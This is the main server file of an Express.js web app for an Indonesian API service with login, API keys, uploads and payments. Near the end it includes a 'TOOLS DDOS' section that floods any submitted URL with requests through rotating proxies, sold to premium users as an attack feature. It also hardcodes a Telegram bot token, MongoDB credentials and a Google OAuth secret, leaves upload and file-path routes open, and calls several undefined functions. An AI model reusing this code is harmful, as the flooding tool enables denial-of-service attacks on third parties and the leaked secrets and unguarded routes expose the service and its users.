const express = require('express');
const os = require('os');
const path = require('path');
const mongoose = require('mongoose');
const passport = require('passport');
const session = require('express-session');
const MongoStore = require('connect-mongo');
const bcrypt = require('bcryptjs');
const nodemailer = require('nodemailer');
const crypto = require('crypto');
const fs = require('fs');
const axios = require('axios');
const bodyParser = require('body-parser');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');
const nodeCron = require('node-cron');
const { v4: uuidv4 } = require('uuid');
const LocalStrategy = require('passport-local').Strategy;
const GoogleStrategy = require('passport-google-oauth20').Strategy;
const GitHubStrategy = require('passport-github2').Strategy;
const apiRoutes = require('./system/api');
const userRoutes = require('./system/routes/userRoutes');
const adminRoutes = require('./system/routes/adminRoutes');
const shortUrlRoutes = require('./system/routes/shortUrlRoutes');
const User = require('./system/models/user');
const listMenu = require('./system/models/listmenu');
const { sendEmail } = require('./system/mailer');
const { Saweria } = require('./system/models/saweria');
const multer = require('multer');
const { chatlogic } = require('./system/models/chatbot');
const telegramChatId = '1585533802';
const OWNER_ID = '1585533802';
const telegramToken = '8128135647:AAGqLTQi0RxTTSsqf-PsdyOWnE4l9_UchJk'
const Function = require("./system/lib/function");
const Func = new Function();

const app = express();
const PORT = process.env.PORT || 3000;

// Configure MongoDB connection
mongoose.connect('mongodb+srv://hams:hamS23@s@cluster8.09myh.mongodb.net/?retryWrites=true&w=majority&appName=Cluster@', {
  useNewUrlParser: true,
  useUnifiedTopology: true
});

const statSchema = new mongoose.Schema({
  totalPermintaan: { type: Number, default: 0 },
  dailyPermintaan: { type: Number, default: 0 },
  lastReset: { type: Date, default: Date.now }
});


const sendMessageToTelegram = async (message) => {
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

    try {
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });
        console.log(`Message sent to Telegram: ${response.data.result.text}`);
    } catch (error) {
        console.error(`Failed to send message to Telegram: ${error.message}`);
    }
};

/*const sendUserDetailsToTelegram = async (userDetails) => {
    const message = `
        𝘼𝘿𝘼 𝙋𝙀𝙉𝙂𝙂𝙐𝙉𝘼 𝘽𝘼𝙍𝙐 𝙉𝙄𝙃
        Name: ${user.username}
        Email: ${user.email}
        Limit: ${user.limit}
        User Role: ${user.premium ? 'Premium User' : 'Free User '}
        Apikey: ${user.apiKey}
    `;
    await sendMessageToTelegram(message);
};*/

const sendLimitResetNotification = async () => {
    const message = 'Limit has been reset.';
    await sendMessageToTelegram(message);
};

// Nodemailer configuration
const transporter = nodemailer.createTransport({
  service: 'Gmail',
  auth: {
    user: 'email lu',
    pass: 'pssword aplikasi email lu'
  }
});

function sendWelcomeEmail(email) {
  const mailOptions = {
    from: 'email lu',
    to: email,
    subject: 'Selamat Datang di Aplikasi Kami!',
    html: `<div
        style="width: 600px; height: 500px;margin: auto;font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;">
        <div
            style="line-height: 2; letter-spacing: 0.5px; position: relative; padding: 10px 20px; width: 540px;min-height: 360px; margin: auto; border: 1px solid #DDD; border-radius: 14px;">
            <h3>Selamat Datang Di Rest-APIs Hams</h3>
            <p>
                Terima Kasih Telah Mendaftar di demo dari website saya,ini source web nya bakal di share secara gratis jika follower channel WhatsApp saya sudah mencapai 150 follower, jika berminat silahkan join ke channel saya lewat button di bawah
            </p>
          <div align="center">
            <img src="https://camo.githubusercontent.com/fbfa09c159814f6e1a90cc6fe53b52053ec0a558abcceb8df8a1d9a2e18de494/68747470733a2f2f766965772e6d6f657a782e63632f696d616765732f323032312f30322f32352f37323137323934613863623939326433376563656562386635613031643130302e676966" width="200px" alt="Hams">
           </div>
            <a style="cursor: pointer;text-align: center; display: block; width: 160px; margin: 30px auto; padding: 10px 10px; border: 1px solid #00FFFA; border-radius: 14px; color: white; text-decoration: none; font-size: 1rem; font-weight: 500; background-color: blue;"
                href="https://whatsapp.com/channel/0029VaZSdai5Ui2TMoNsYo0Jy}">Join Chanel WhatsApp</a>
            <span style="display: block;">
<br>
Hubungi saya di WhatsApp jika ada kendala, dan request fitur<span
                    style="color: #4D96FF;"><a href="https://api.whatsapp.com/send?phone=6285781549773">WhatsApp</a></span></span>
            <span style="display: block;"><br>By,<br>Hams Offc</span>
        </div>
    </div>`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log('Error sending email: ', error);
    } else {
      console.log('Email sent: ' + info.response);
    }
  });
}


// Session middleware
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: 'secret',
  resave: false,
  saveUninitialized: false
}));

const Stat = mongoose.model('Stat', statSchema);

let totalPermintaan = 0;
let dailyPermintaan = 0;
const serverWaktumulai = Date.now();

const resetDailyPermintaan = async () => {
  dailyPermintaan = 0;
  await Stat.updateOne({}, { dailyPermintaan: 0, lastReset: Date.now() });
};

const loadInitialStats = async () => {
  const stat = await Stat.findOne();
  if (stat) {
    totalPermintaan = stat.totalPermintaan;
    dailyPermintaan = stat.dailyPermintaan;
  } else {
    await new Stat().save();
  }
};

loadInitialStats();

app.use(async (req, res, next) => {
  totalPermintaan++;
  dailyPermintaan++;
  
  await Stat.updateOne({}, { $inc: { totalPermintaan: 1, dailyPermintaan: 1 } });
  
  next();
});

function saveIPAddress(req, res, next) {
  const ipAddress = req.ip;
  if (req.user) {
    req.user.ipAddress = ipAddress;
    req.user.save();
  }
  next();
}

function ensureAdmin(req, res, next) {
  if (req.isAuthenticated() && req.user.isAdmin) {
    return next();
  }
  res.json(403).send('Akses ditolak. Hanya untuk admin.');
}

// Use saveIPAddress middleware before ensureAuthenticated middleware
app.use(saveIPAddress);

// Initialize Passport
app.use(passport.initialize());
app.use(passport.session());

// Passport Local Strategy configuration
passport.use(new LocalStrategy(
  {
    usernameField: 'login',
    passwordField: 'password'
  },
  async (login, password, done) => {
    try {
      const user = await User.findOne({ $or: [{ username: login }, { phoneNumber: login }] });
      if (!user) {
        return done(null, false, { message: 'Invalid login credentials' });
      }
      const isPasswordValid = await bcrypt.compare(password, user.password);
      if (!isPasswordValid) {
        return done(null, false, { message: 'Invalid login credentials' });
      }
      if (!user.isVerified) {
        return done(null, false, { message: 'Please verify your email or phone number first' });
      }
      return done(null, user);
    } catch (err) {
      return done(err);
    }
  }
));

// LOGIN MENGGUNAKAN APIKEY
async function apiKeyAuth(req, res, next) {
  const apiKey = req.query.apikey || req.headers['x-api-key'];
  if (!apiKey) {
    return res.status(401).json({ error: 'API key is missing' });
  }

  try {
    const user = await User.findOne({ apiKey: apiKey });
    if (!user) {
      return res.status(401).json({ error: 'Invalid API key' });
    }

    // Set the user in the request object
    req.user = user;
    next();
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
}


// Dalam strategi Google
passport.use(new GoogleStrategy({
    clientID: '23886198282-74odsnapmbug9snjfbabn7f2qnm44rp4.apps.googleusercontent.com',
    clientSecret: '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',
    callbackURL: 'http://api.hambotzz.biz.id/auth/google/callback'
  },
  async function(accessToken, refreshToken, profile, done) {
    try {
      let user = await User.findOne({ googleId: profile.id });
      if (!user) {
        const apiKey = `KC-${crypto.randomBytes(8).toString('hex')}`;
        user = new User({
          googleId: profile.id,
          username: profile.displayName,
          email: profile.emails[0].value,
          limit: 100,
          profile: profile.photos[0].value,
          apiKey: apiKey,
          premium: false,
          premiumTime: 0,
          defaultKey: apiKey,
          isAdmin: false,
          saweriaUserId: "user id saweria",
          ipAddress: 0,
        });
        await user.save();
        sendWelcomeEmail(user.email); // Kirim email sambutan
        sendUserDetailsToTelegram(user); // Kirim detail pengguna baru ke Telegram
      }
      return done(null, user);
    } catch (err) {
      return done(err);
    }
  }
));


// Dalam strategi GitHub
passport.use(new GitHubStrategy({
  clientID: 'client id github lu',
  clientSecret: 'client secret github lu',
  callbackURL: 'https://api.hambotzz.biz.id/auth/github/callback'
},
async function(accessToken, refreshToken, profile, done) {
  try {
    console.log('AccessToken:', accessToken);
    console.log('Profile:', profile);

    let user = await User.findOne({ githubId: profile.id });
    if (!user) {
      const apiKey = `KC-${crypto.randomBytes(8).toString('hex')}`;
      user = new User({
        githubId: profile.id,
        username: profile.username,
        email: "emailandakosong",
        limit: 1000,
        profile: profile.photos[0].value,
        apiKey: apiKey,
        premium: false,
        premiumTime: 0,
        defaultKey: apiKey,
        isAdmin: false,
        saweriaUserId: "id saweria lu",
        ipAddress: 0,
      });
      await user.save();
      sendUserDetailsToTelegram(user); // Kirim detail pengguna baru ke Telegram
    }
    return done(null, user);
  } catch (err) {
    console.error('Error during GitHub authentication:', err);
    return done(err);
  }
}));

passport.serializeUser(function(user, done) {
  done(null, user.id);
});

passport.deserializeUser(async function(id, done) {
  try {
    const user = await User.findById(id);
    done(null, user);
  } catch (err) {
    done(err);
  }
});

// Set view engine to EJS
app.use(express.static(path.join(__dirname, 'public')));
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

// Routes for Google authentication
app.get('/auth/google',
  passport.authenticate('google', { scope: ['profile', 'email'] }));

app.get('/auth/google/callback', 
  passport.authenticate('google', { failureRedirect: '/' }),
  function(req, res) {
    res.redirect('/dashboard');
  });

// Routes for GitHub authentication
app.get('/auth/github',
  passport.authenticate('github', { scope: ['user:email'] }));

app.get('/auth/github/callback',
  passport.authenticate('github', { failureRedirect: '/' }),
  function(req, res) {
    res.redirect('/dashboard');
  });

// Add this route to handle API key login
app.post('/auth/apikey', async (req, res, next) => {
  const { apikey } = req.body;
  try {
    const user = await User.findOne({ apiKey: apikey });
    if (!user) {
      return res.status(401).json({ message: 'Invalid API key' });
    }
    req.login(user, (err) => {
      if (err) {
        return next(err);
      }
      res.redirect('/dashboard');
    });
  } catch (err) {
    next(err);
  }
});



// Middleware to ensure user is authenticated (supports session and API key authentication)
function ensureAuthenticated(req, res, next) {
  if (req.isAuthenticated() || req.user) {
    return next();
  }
  res.redirect('/auth/login');
}

// Route for dashboard
app.get('/dashboard', ensureAuthenticated, async (req, res) => {
  const userCount = await User.countDocuments();
  res.render('dashboard', { user: req.user, userCount: userCount });
});


// Route for profile page
app.get('/profile', ensureAuthenticated, (req, res) => {
  res.render('profile', { user: req.user });
});

// Route for login
app.get('/auth/login', (req, res) => {
  res.render('login');
});

// Route for logout
app.get('/logout', (req, res) => {
  req.logout();
  res.redirect('/');
});

// Route for home page
app.get('/', async (req, res) => {
  const userCount = await User.countDocuments();
  res.render('index', { userCount });
});

// Route to get user count
app.get('/user-count', async (req, res) => {
  try {
    const userCount = await User.countDocuments();
    res.json({ count: userCount });
  } catch (err) {
    res.status(500).json({ error: 'Error fetching user count' });
  }
});

// Middleware to check API key and limit
async function checkApiKey(req, res, next) {
  const apiKey = req.query.apikey;
  if (!apiKey) {
    return res.status(401).json({ error: 'API key is missing' });
  }
  const user = await User.findOne({ apiKey: apiKey });
  if (!user) {
    return res.status(401).json({ error: 'Invalid API key' });
  }
  const now = Math.floor(Date.now() / 1000);
  if (user.premium && user.premiumTime < now) {
    user.premium = false;
    user.premiumTime = 0;
    user.limit = 1000;
    await user.save();
  }
  if (!user.premium && user.limit <= 0) {
    return res.status(429).json({ error: 'API limit exceeded' });
  }
  req.user = user;
  next();
}

// Example API route with API key and limit check
app.get('/api/some-feature', checkApiKey, async (req, res) => {
  const user = req.user;
  const cost = 5;
  if (!user.premium && user.limit < cost) {
    return res.status(429).json({ error: 'API limit exceeded' });
  }
  if (!user.premium) {
    user.limit -= cost;
  }
  await user.save();
  res.json({ message: 'Feature accessed successfully' });
});

// Fungsi untuk mengirim notifikasi reset limit ke semua email yang ada di database
async function sendLimitResetEmailToAllUsers() {
  try {
    const users = await User.find();
    const message = 'Limit pengguna telah direset untuk hari ini.';
    for (const user of users) {
      const mailOptions = {
        from: 'ibham913@gmail.com',
        to: user.email,
        subject: 'Reset Limit Pengguna',
        html: `<div style="width: 600px; margin: auto; font-family: Arial, sans-serif;">
                 <h3>Limit Pengguna Telah Direset</h3>
                 <p>${message}</p>
                 <br>
                 <p>Salam,</p>
                 <p>Tim Hams Offc</p>
               </div>`
      };
      transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
          console.log('Error sending email: ', error);
        } else {
          console.log('Email sent: ' + info.response);
        }
      });
    }
    console.log('Notifikasi reset limit telah dikirim ke semua pengguna.');
  } catch (error) {
    console.error('Error:', error);
    console.log('Terjadi kesalahan saat mengirim notifikasi reset limit.');
  }
}

// Jadwalkan tugas untuk mengirim notifikasi reset limit setiap hari pada pukul 00:00
nodeCron.schedule('0 0 * * *', async () => {
  // Reset limits every midnight
  const freeLimit = 100;
  const users = await User.find();
  const now = Math.floor(Date.now() / 1000);

  for (const user of users) {
    if (user.premium && user.premiumTime < now) {
      user.premium = false;
      user.premiumTime = 0;
      user.limit = freeLimit;
      await user.save();
      sendPremiumExpiredEmail(user);
      sendPremiumExpiredNotification(user);
    } else if (!user.premium) {
      user.limit = freeLimit;
    }
    await user.save();
  }
  sendLimitResetNotification(); // Kirim notifikasi reset limit ke Telegram

  // Kirim notifikasi reset limit ke semua email yang ada di database
  sendLimitResetEmailToAllUsers();
});


function sendPremiumExpiredEmail(user) {
  const mailOptions = {
    from: 'ibham913@gmail.com',
    to: user.email,
    subject: 'Status Premium Anda Telah Berakhir',
    html: `<div style="width: 600px; margin: auto; font-family: Arial, sans-serif;">
             <h3>Status Premium Berakhir</h3>
             <p>Hai ${user.username},</p>
             <p>Status premium Anda telah berakhir. Anda sekarang menggunakan layanan gratis kami dengan batas penggunaan yang terbatas.</p>
             <p>Terima kasih telah menggunakan layanan premium kami.</p>
             <br>
             <p>Salam,</p>
             <p>Tim Hams Offc</p>
           </div>`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log('Error sending email: ', error);
    } else {
      console.log('Email sent: ' + info.response);
    }
  });
}


// Configure Multer storage and file filtering
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, path.join(__dirname, 'tmp'));
  },
  filename: (req, file, cb) => {
    const randomCode = Math.floor(Math.random() * 10000000000).toString().padStart(10, '0');
    const fileExtension = path.extname(file.originalname);
    cb(null, `${randomCode}${fileExtension}`);
  }
});

const fileFilter = (req, file, cb) => {
  const allowedTypes = ['image/jpeg', 'image/png', 'audio/mpeg', 'video/mp4'];
  if (allowedTypes.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Invalid file type'), false);
  }
};

const upload = multer({ storage, fileFilter });

// Route to render the upload form
app.get('/upload', ensureAuthenticated, (req, res) => {
  const user = req.user;
  res.render('upload', { user: user });
});

// Route to handle file upload
app.post('/upload', ensureAuthenticated, upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded or invalid file type' });
  }
  // Dapatkan URL file berdasarkan nama file
  const fileUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
  res.json({ message: 'File uploaded successfully', fileUrl: fileUrl });
});

// Route to serve uploaded files
app.get('/uploads/:filename', (req, res) => {
  const filePath = path.join(__dirname, 'tmp', req.params.filename);
  res.sendFile(filePath);
});

// Remove ensureAuthenticated middleware from the upload route
app.get('/upload', (req, res) => {
  const user = req.user;
  res.render('upload', { user: user });
});

app.post('/chat', ensureAuthenticated, async (req, res) => {
    const { prompt } = req.body;
    try {
        const answer = await chatlogic(prompt);
        res.json({ answer });
    } catch (error) {
        res.status(500).json({ error: 'Failed to get response from chatbot' });
    }
});

app.get('/chatbot', ensureAuthenticated, (req, res) => {
  const user = req.user;
  res.render('chatbot', { user: user });
});

// Route untuk halaman download
app.get('/download', ensureAuthenticated, (req, res) => {
  const user = req.user;
  res.render('download', { user: user, listMenu: listMenu });
});

app.get('/feature/:page', ensureAuthenticated, (req, res) => {
  const user = req.user;
  const page = req.params.page;
  res.render(`feature/${page}`, { user: user });
});



// Remove ensureAuthenticated middleware from the file upload route
app.post('/upload', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded or invalid file type' });
  }
  // Dapatkan URL file berdasarkan nama file
  const fileUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
  res.json({ message: 'File uploaded successfully', fileUrl: fileUrl });
});

// Import API and user routes
app.use('/', apiRoutes);
app.use('/', adminRoutes);
app.use('/users', userRoutes);

app.use(express.json());

// Route to change username based on current username
app.put('/change-username', ensureAuthenticated, async (req, res) => {
  try {
    const newUsername = req.body.username;
    const existingUser = await User.findOne({ username: newUsername });
    if (existingUser) {
      return res.status(400).json({ error: 'Username is already taken' });
    }
    req.user.username = newUsername;
    await req.user.save();
    res.json({ message: 'Username changed successfully' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Rute untuk menampilkan form konversi gambar
app.get('/convert-image', ensureAuthenticated, (req, res) => {
  res.render('convert-image');
});

// Rute untuk menangani unggahan dan konversi gambar
app.post('/convert-image', ensureAuthenticated, upload.single('file'), async (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'Tidak ada file yang diunggah atau tipe file tidak valid' });
  }
  const fileUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
  
  try {
    const response = await axios.get(`https://api.hambotzz.biz.id/ai/toanime?url=${fileUrl}&apikey=HamsOffc`);
    const convertedImageUrl = response.data; // Sesuaikan dengan struktur respon API yang sebenarnya
    res.json({ message: 'Gambar berhasil dikonversi', fileUrl: fileUrl, convertedImageUrl: convertedImageUrl });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Terjadi kesalahan saat mengkonversi gambar' });
  }
});



function sendPremiumExpiredNotification(user) {
  const message = `Status premium pengguna ${user.username} telah berakhir.`;
  bot.sendMessage(telegramChatId, message, { parse_mode: 'HTML' });
}

app.use('/shorturl', shortUrlRoutes);
// Route untuk form short URL
app.get('/shorturl', (req, res) => {
  const user = req.user;
  res.render('shorturl', { user: user });
});

app.get('/payment', ensureAuthenticated, (req, res) => {
  const user = req.user;
  res.render('payment', { user: user });
});

app.post('/create-payment', ensureAuthenticated, async (req, res) => {
  const { amount, message } = req.body;
  const saweria = new Saweria(req.user.saweriaUserId);

  try {
    const payment = await saweria.createPayment(amount, message);
    if (!payment.status) {
      return res.status(500).json({ error: payment.msg });
    }
    res.json(payment.data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/check-payment/:id', ensureAuthenticated, async (req, res) => {
  const { id } = req.params;
  const saweria = new Saweria(req.user.saweriaUserId);

  try {
    const paymentStatus = await saweria.checkPayment(id);
    if (!paymentStatus.status) {
      return res.status(500).json({ error: paymentStatus.msg });
    }
    res.json(paymentStatus);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// TOOLS DDOS 
const userIP = 'PermenMD';
const proxyListFile = 'proxy.txt';
const totalRequests = 5000;
const delay = 100;

const allowedIPs = ['PermenMD'];

function readProxyList() {
  try {
    const data = fs.readFileSync(proxyListFile, 'utf8');
    const lines = data.trim().split('\n');
    return lines.map(line => line.trim());
  } catch (error) {
    console.error(`Gagal membaca daftar proxy: ${error}`);
    return [];
  }
}

function sendRequest(target, agent, userIP) {
  if (allowedIPs.includes(userIP)) {
    axios.get(target, { httpAgent: agent })
      .then((response) => {
        console.log(`Menyerang ${target}`);
      })
      .catch((error) => {
        console.error(`Menyerang ${target}`);
      });
  } else {
    console.error(`IP Anda tidak terdaftar`);
  }
}

function sendRequests(targetUrl) {
  const proxyList = readProxyList();
  let currentIndex = 0;

  function sendRequestUsingNextProxy() {
    if (currentIndex < proxyList.length) {
      const proxyUrl = proxyList[currentIndex];
      let agent;

      if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
        agent = new SocksProxyAgent(proxyUrl);
      } else if (proxyUrl.startsWith('https')) {
        agent = new HttpsProxyAgent({ protocol: 'http', ...parseProxyUrl(proxyUrl) });
      }

      sendRequest(targetUrl, agent, userIP);
      currentIndex++;
      setTimeout(sendRequestUsingNextProxy, 0);
    } else {
      setTimeout(() => sendRequests(targetUrl), delay);
    }
  }

  sendRequestUsingNextProxy();
}

// Route untuk memulai serangan proxy
app.post('/start', ensureAuthenticated, async (req, res) => {
  const { targetUrl } = req.body;
  const user = req.user;

  if (!user.premium) {
    return res.status(403).json({ error: 'Anda belum premium silahkan beli premium terlebih dahulu' });
  }

  sendRequests(targetUrl);

  try {
    // Logic untuk menyerang proxy di sini
    res.json({ message: `Attack on ${targetUrl} started successfully.` });
  } catch (error) {
    res.status(500).json({ error: 'Terjadi kesalahan saat memulai serangan.' });
  }
});



app.get('/attack', ensureAuthenticated, (req, res) => {
  const user = req.user;
  const targetUrl = req.body.targetUrl;
  res.render('attack', { targetUrl, user: user });
});


app.get('/feature/ai', ensureAuthenticated, (req, res) => {
  const user = req.user;
  res.render('/feature/ai', { user: user, listMenu: listMenu });
});

app.get('/feature/saweria', ensureAuthenticated, (req, res) => {
  const user = req.user;
  res.render('/feature/saweria', { user: user });
});

app.post('/convert', async (req, res) => {
  const imageUrl = req.body.imageUrl;
  if (!imageUrl) {
    return res.status(400).json({ success: false, message: 'No URL provided' });
  }

  try {
    const convertedImageUrl = `https://skizo.tech/api/toanime?apikey=Kemii&url=${encodeURIComponent(imageUrl)}`;
    res.json({ success: true, imageUrl: convertedImageUrl });
  } catch (e) {
    console.error(e);
    res.status(500).json({ success: false, message: 'Error converting image' });
  }
});

app.get('/feature/imagetoanime', ensureAuthenticated, (req, res) => {
  const user = req.user;;
  res.render('/feature/convertoanime', { user: user });
});

app.get('/feature/tools', ensureAuthenticated, (req, res) => {
  const user = req.user;;
  res.render('/feature/tools', { user: user });
});

app.get('/feature/search', ensureAuthenticated, (req, res) => {
  const user = req.user;;
  res.render('/feature/search', { user: user });
});

app.get('/feature/canva', ensureAuthenticated, (req, res) => {
  const user = req.user;;
  res.render('/feature/canva', { user: user });
});

app.get('/feature/orkut', ensureAuthenticated, (req, res) => {
  const user = req.user;;
  res.render('/feature/orkut', { user: user });
});

app.get('/feature/stalk', ensureAuthenticated, (req, res) => {
  const user = req.user;;
  res.render('/feature/stalk', { user: user });
});

app.get('/stats', async (req, res) => {
  try {
    const totalUsers = await User.countDocuments();
    const usedMemory = process.memoryUsage().rss / (1024 * 1024); // Convert to MB
    const runtime = (Date.now() - serverWaktumulai) / 1000; // Convert to seconds

    res.json({
      dailyPermintaan,
      totalPermintaan,
      totalUsers,
      usedMemory: `${usedMemory.toFixed(2)} MB`,
      runtime: `${Math.floor(runtime / 3600)}h ${Math.floor((runtime % 3600) / 60)}m ${Math.floor(runtime % 60)}s`
    });
  } catch (err) {
    console.error('Error fetching stats:', err);
    res.status(500).json({ error: 'Error fetching statistics' });
  }
});

const scheduleDailyReset = () => {
  const now = new Date();
  const midnight = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1);
  const timeUntilMidnight = midnight - now;

  setTimeout(() => {
    resetDailyPermintaan();
    scheduleDailyReset();
  }, timeUntilMidnight);
};

scheduleDailyReset();

app.post('/change-ip', async (req, res) => {
  const apikey = req.body.apikey;
  const newIP = req.body.newIP;
  if (!newIP) {
    return res.status(400).json({ error: 'New IP address is required' });
  }

  try {
    const user = await User.findOne({ apiKey: apikey });
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    user.ipAddress = newIP;
    await user.save();
    res.json({ message: 'IP address updated successfully' });
  } catch (err) {
    console.error('Error updating IP address:', err);
    res.status(500).json({ error: 'Error updating IP address' });
  }
})

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
